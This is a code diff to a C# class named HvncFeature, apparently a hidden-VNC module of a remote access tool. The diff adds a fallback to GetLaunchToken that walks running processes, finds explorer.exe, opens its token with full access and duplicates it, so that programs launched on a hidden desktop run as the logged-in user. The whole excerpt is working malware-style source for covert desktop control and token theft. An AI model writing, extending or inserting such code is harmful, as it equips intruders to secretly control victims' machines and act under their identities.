@@ -1871,11 +1871,9 @@ internal static class HvncFeature
     // Caller is responsible for CloseHandle. Returns 0 if not applicable / unavailable.
     private static nint GetLaunchToken()
     {
-        const uint TOKEN_ALL_ACCESS = 0xF01FF;
+        const uint TOKEN_ALL_ACCESS      = 0xF01FF;
+        const uint PROCESS_QUERY_LIMITED = 0x1000;
 
-        // Only for SYSTEM: get the interactive user token via WTS so explorer
-        // runs with the correct HKCU and session. Admin/User: return 0 and let
-        // the caller use CreateProcessW directly (same token, hidden desktop via lpDesktop).
         uint session = WTSGetActiveConsoleSessionId();
         if (session != 0xFFFFFFFF && WTSQueryUserToken(session, out nint wtsToken))
         {
@@ -1883,6 +1881,31 @@ internal static class HvncFeature
             { CloseHandle(wtsToken); return dup; }
             CloseHandle(wtsToken);
         }
+
+        nint snap = CreateToolhelp32Snapshot(2, 0);
+        if (snap == (nint)(-1)) return 0;
+        try
+        {
+            var e = new PROCESSENTRY32W { dwSize = (uint)Marshal.SizeOf<PROCESSENTRY32W>() };
+            if (!Process32FirstW(snap, ref e)) return 0;
+            do
+            {
+                if (!e.szExeFile.Equals("explorer.exe", StringComparison.OrdinalIgnoreCase)) continue;
+                nint hProc = OpenProcess(PROCESS_QUERY_LIMITED, false, e.th32ProcessID);
+                if (hProc == 0) continue;
+                if (OpenProcessToken(hProc, TOKEN_ALL_ACCESS, out nint hTok))
+                {
+                    CloseHandle(hProc);
+                    if (DuplicateTokenEx(hTok, TOKEN_ALL_ACCESS, 0, 2, 1, out nint dup))
+                    { CloseHandle(hTok); return dup; }
+                    CloseHandle(hTok);
+                    return 0;
+                }
+                CloseHandle(hProc);
+            }
+            while (Process32NextW(snap, ref e));
+        }
+        finally { CloseHandle(snap); }
         return 0;
     }
 
